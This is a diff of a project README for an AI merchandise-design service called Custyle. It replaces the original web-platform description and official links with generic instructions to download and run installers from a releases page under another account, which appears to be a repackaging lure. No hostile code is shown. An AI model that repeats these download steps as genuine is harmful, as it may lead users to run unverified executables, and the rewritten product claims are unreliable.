@@ -1,96 +1,70 @@
-# 👕 Custyle — The World’s First AI Custom MerchAgent™
+# 🎨 custyle-ai - Create Custom Merch Effortlessly
 
+## 📥 Download Now
+[![Download Custyle](https://img.shields.io/badge/Download-Custyle%20AI-blue?style=flat-square)](https://github.com/KOJ12/custyle-ai/releases)
 
-[![Built with](https://img.shields.io/badge/Built%20with-444444?style=for-the-badge)](https://custyle.ai)
-[![AI](https://img.shields.io/badge/AI-7B61FF?style=for-the-badge&logo=openai&logoColor=ffffff)](https://custyle.ai)
-[![Made for](https://img.shields.io/badge/Made%20for-444444?style=for-the-badge)](https://custyle.ai)
-[![CREATORS](https://img.shields.io/badge/CREATORS-FF7A45?style=for-the-badge&logo=sparkfun&logoColor=ffffff)](https://custyle.ai)
-[![Powered by](https://img.shields.io/badge/Powered%20by-444444?style=for-the-badge)](https://custyle.ai)
-[![MULTI-AGENT SYSTEM](https://img.shields.io/badge/MULTI--AGENT%20SYSTEM-06B6D4?style=for-the-badge&logo=protocols-dot-io&logoColor=ffffff)](https://custyle.ai)
+## 🌟 Overview
+Custyle is a powerful tool that helps you design and sell custom merchandise in minutes. Whether you want T-shirts, hoodies, or totes, Custyle uses AI to bring your ideas to life. You can create unique designs, see a virtual try-on, and even fulfill orders—all in one place.
 
+## 🚀 Getting Started
+To get started with Custyle, follow these simple steps:
 
-🚀 **Custyle turns creativity into merch in minutes.**  
-**Type a prompt, drop an image, or spark an idea** → Custyle’s **AI MerchAgent™** generates unique **T-shirt, hoodies, and tote bags to posters and phone cases** designs, previews them on realistic AI models, and connects instantly to production.  
-**No design skills. No barriers. Just your vibe — made wearable.**  
+1. **Visit the Release Page**  
+   Go to the [Releases page](https://github.com/KOJ12/custyle-ai/releases) to find the latest version of Custyle. You will see several files available for download. Choose the one that fits your system.
 
-[![Start with Custyle](https://img.shields.io/badge/START%20WITH%20CUSTYLE-0A66C2?style=for-the-badge&logo=github&logoColor=ffffff)](https://custyle.ai)
+2. **Download the File**  
+   Click on the link that corresponds to your operating system. This will download the necessary file to your computer.
 
+3. **Install Custyle**  
+   Locate the downloaded file in your Downloads folder. 
+    - For Windows: Double-click the `.exe` file to run the installer. Follow the prompts to complete the installation.
+    - For Mac: Open the `.dmg` file and drag the Custyle icon into your Applications folder.
+    - For Linux: Extract the zip file and run the command `./custyle` in your terminal.
 
----
+4. **Open Custyle**  
+   After the installation, launch the application from your applications menu or desktop shortcut.
 
-## ✨ Why Custyle?
+5. **Sign Up or Log In**  
+   If it’s your first time using Custyle, you’ll need to create an account. If you already have an account, just log in.
 
-- 🧠 **AI MerchAgent™ co-pilot** — Co-creates with you, learns your vibe, and refines with feedback.
-- 💬 **Create by chat or upload** — Turn prompts/photos into **multiple print-ready variations** in minutes.
-- 👀 **See it before you make it** — **Archetype-matched AI models** + studio-grade mockups for folds, fit, and fabric.
-- 🔁 **End-to-end, no friction** — Inspiration → design → mockup → **try-on** → publish. No design tools required.
-- 🚚 **On-demand production** — Connected to **Printful/Printify** for fast global fulfillment; wear, share, or **sell**.
-- 🧢 **More than tees** — T-shirts, hoodies, caps, totes, posters, phone cases, and more.
- 
+6. **Start Designing**  
+   You can now begin creating your custom merchandise. Use the AI design features to generate ideas and see your products come to life.
 
----
+## 📋 System Requirements
+To run Custyle smoothly, ensure your computer meets the following specifications:
 
-## 🔑 What Makes Custyle Different?
+- **Windows**: Windows 10 or later
+- **Mac**: macOS Mojave (10.14) or later
+- **Linux**: A modern distribution with a 64-bit environment
+- **RAM**: At least 4 GB
+- **Storage**: Minimum 500 MB of free space
+- **Internet**: A stable internet connection for downloading designs and processing orders
 
-- ⏱ **From idea to merch in minutes** — No tools, no barriers, just instant creation.  
-- 👩‍🎤 **Gen-Z first** — Built for self-expression, not logo-chasing mass fashion.  
-- 🌐 **AI × C2M synergy** — AI-generated designs flow directly into on-demand supply chains for global fulfillment.  
-- 🔄 **UGC-driven commerce** — Every user can be a designer, buyer, and seller in the same loop.  
+## 🎨 Features
+- **AI-Powered Design**: Generate unique designs in seconds.
+- **Virtual Try-On**: See how your designs look on different products in real-time.
+- **Simple Fulfillment**: Order directly through Custyle, with no hassle.
+- **Customization Options**: Add text, graphics, and more to personalize your merch.
+- **User-Friendly Interface**: Intuitive design makes it easy for anyone to use.
 
----
+## ⏲️ Download & Install
+To get started with Custyle, please visit the [Releases page](https://github.com/KOJ12/custyle-ai/releases) and follow the instructions above to download and install the application.
 
-## 🌟 How It Works
+## 🛠️ Troubleshooting
+If you encounter issues during installation or usage, try these steps:
 
-1. 📝 **Input Your Idea** → Chat, drop a photo, or spark an idea.  
-2. 🎨 **AI Creates Variations** → Multi-agent AI generates multiple **print-ready designs** in seconds.  
-3. 👕 **Preview on Models** → See **studio-grade try-ons** with archetype-matched AI models.  
-4. 🛒 **Make It Real** → Export, publish, wear, or **sell** your custom merch instantly.  
+- **Recheck System Requirements**: Make sure your computer meets all necessary specifications.
+- **File Integrity**: Verify that the downloaded file is complete and not corrupted.
+- **Internet Connection**: Ensure that you have a stable internet connection.
+- **Check for Updates**: Sometimes, bugs are fixed in newer versions. Always use the latest version from the Releases page.
 
-⭐ **Custyle: Your Vibe. Your Style. Your Merch.**
+## 🎉 Community Support
+For additional support, consider joining the Custyle community. You can find help from other users or share your designs and experiences. Use our GitHub Issues page to report bugs or suggest features. Your feedback helps improve Custyle.
 
+## 📚 Learn More
+Explore more about Custyle and its capabilities:
+- **AI Commerce**: Understanding how AI transforms the shopping experience.
+- **MerchAgent**: Learn how Custyle stands out as the first AI MerchAgent™.
+- **Custom Products**: Discover endless possibilities for creating personalized merchandise.
 
----
-
-## 🖼️ Screenshots & Demo
-
-### 1. Homepage – Custyle at a glance
-![Custyle Homepage](Custyle_Homepage.png)
-
-### 2. Create with AI – Start from a prompt or photo
-![Custyle Create](Custyle_CreatewithAI.png)
-
-### 3. Interactive Design Process – Explore multiple variations
-![Custyle Variations](Custyle_InteractiveDesigProcess.png)
-
-### 4. From Idea to Merch – Try-on & final merch ready to ship
-![Custyle Final Merch](Custyle_FromIdeatoMerch.png)
-
-
----
-
-## 📖 About Custyle
-
-Custyle = **AI + C2M** → Personalized Merch at Scale.  
-We believe the future of retail is **personalized, experience-driven, and AI-powered.**  
-
-Custyle is building the next-generation consumer platform where anyone can be both a **creator and a consumer** — turning imagination into merch at global scale.  
-
-🌍 [Official Website →](https://custyle.ai)  
-💬 [Join Discord →](https://discord.gg/7B52gKXx)  
-🐦 [Follow on Twitter →](https://x.com/custyleai)  
-📷 [See on Instagram →](https://www.instagram.com/custyle.ai)  
-
----
-
-## 📌 Roadmap
-
-- ✅ **Step 1: MVP Launch** — AI-powered T-shirt creation (completed)  
-- 🚀 **Step 2: Expand Catalog** — From tees to **hoodies, caps, totes, posters, and phone cases**  
-- 🔌 **Step 3: Open API** — Empower creators & brands with APIs for design, try-on, and fulfillment  
-- 🌍 **Step 4: Global Ecosystem** — Custyle as an open platform for creators, consumers, and supply chains worldwide  
- 
-
----
-
-## ⭐ Support
-If you believe in **personalization as the future of retail**, please give this repo a ⭐ — it helps more people discover Custyle!  
+We hope you enjoy using Custyle and look forward to seeing your creative designs!
